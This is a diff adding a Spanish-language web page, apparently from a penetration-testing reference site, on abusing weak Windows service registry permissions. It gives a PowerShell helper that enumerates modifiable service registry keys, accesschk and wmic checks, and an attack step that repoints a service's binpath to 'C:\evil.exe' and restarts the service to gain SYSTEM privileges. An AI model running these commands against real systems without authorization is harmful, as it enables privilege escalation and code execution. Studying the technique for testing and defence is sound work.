@@ -1,0 +1,74 @@
+<h1>Permisos en el Registro</h1>
+
+<p class="mainComment">
+    Los servicios del sistema, generalmente son ejecutados en un nivel de integridad alto con SYSTEM y además, son instalados con programas 
+    de terceros que no siempre tienen en consideración las medidas de seguridad apropiadas, lo que puede dejar expuestos puntos débiles que 
+    los atacantes pueden aprovechar.
+</p>
+<p>
+    En algunos casos, los servicios no realizan adecuadamente una restricción de permisos sobre los registros de configuración que son creados 
+    durante la instalación. Si un atacante puede manipular el registro de configuración, puede cambiar la referencia al binario que se ejecutará 
+    y podrá ejecutar su código malicioso y realizar así una escalada de privilegios.
+</p>
+
+<h2 id="fauxiliar"><i class="bi bi-check-circle me-2"></i></i>Función Auxiliar</h2>
+<p class="mainComment">
+    Esta función está basada en PowerSploit y se encarga de comprobar si el usuario tiene permisos suficientes para modificar un dirtectorio o registro.<br>
+    <span class="text-success">
+        <i class="bi bi-exclamation-triangle-fill me-2"></i>Algunos scripts de este apartado necesitan la siguiente función, simplemente copia y pega su 
+        contenido.
+    </span>
+</p>
+
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet code_powershell"><code data-language="shell">function ModifiablePath {param ([Parameter(Mandatory = $true)][String[]]$Paths);$Sids = [System.Security.Principal.WindowsIdentity]::GetCurrent().Groups | Select-Object -ExpandProperty Value;$Sids += $UserIdentity.User.Value;ForEach($Path in $Paths){if (-Not(Test-Path -Path $Path -ErrorAction SilentlyContinue)){$Path=Split-Path -Path $Path -Parent};if (Test-Path -Path $Path -ErrorAction SilentlyContinue) {$FILE=Resolve-Path -Path $Path | Select-Object -ExpandProperty Path;Get-Acl -Path $Path | Select-Object -ExpandProperty Access | Where-Object {($_.AccessControlType -match 'Allow')} | ForEach-Object {if($_.FileSystemRights){$Rights = $_.FileSystemRights.value__}else{$Rights = $_.RegistryRights.value__};if(@([uint32]'0x40000000',[uint32]'0x10000000',[uint32]'0x02000000',[uint32]'0x00080000',[uint32]'0x00040000',[uint32]'0x00000004',[uint32]'0x00000002') | Where-Object { $Rights -band $_ }){if ($Sids -contains $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) | Select-Object -ExcludeProperty Value) {$Path}}}}}}
+</code></pre>
+</div>
+<!-- Code-->
+
+
+<h2><i class="bi bi-check-circle me-2"></i>Registros De Servicios</h2>
+<p class="mainComment">
+    Función automática en PowerShell que pasa por todos los registros de servicio comprobando si el usuario puede modificarlos.<br>
+    <span class="text-success"><i class="bi bi-exclamation-triangle-fill me-1"></i>Requiere función auxiliar</span>
+</p>
+
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet code_powershell"><code data-language="shell">ls HKLM:\SYSTEM\CurrentControlSet\Services\ | ForEach-Object { ModifiablePath $_.PSPath}
+</code></pre>
+</div>
+<!-- Code-->
+
+<p class="mainComment">
+    También es posible realizar una comprobación manual con CMD, pero es necesaria la utilización de las herramientas de Microsoft de Sysinternals 
+    <a class="linksref" target="_blank" href="https://learn.microsoft.com/es-es/sysinternals/downloads/sysinternals-suite/">
+        <i class="bi bi-box-arrow-up-right"></i>
+    </a> para comprobar los permisos sobre los registros.
+</p>
+
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Lista todos los servicios
+wmic service list brief
+#Comprobar los permisos del registro
+accesschk.exe /accepteula -kdqv "HKLM\SYSTEM\CurrentControlSet\Services\[Service_Name]"
+</code></pre>
+</div>
+<!-- Code-->
+
+<h3>◍ Ataque</h3>
+<p class="mainText">
+    Si se puede modificar esa ruta del registro, entonces se podrá simplemente cambiar la ruta del binario que se va a ejecutar y provocar el arranque del servicio.
+</p>
+<div class="snipet_custom position-relative">
+
+<!-- Code snipet-->
+<pre class="code_snipet"><code data-language="shell">#Cambia la ruta a un binario malicioso
+sc config [Service_Name] binpath= "cmd \c C:\evil.exe"
+#Reinicia el servicio
+net stop [Service_Name] && net start [Service_Name]
+</code></pre>
+</div>
+<!-- Code-->
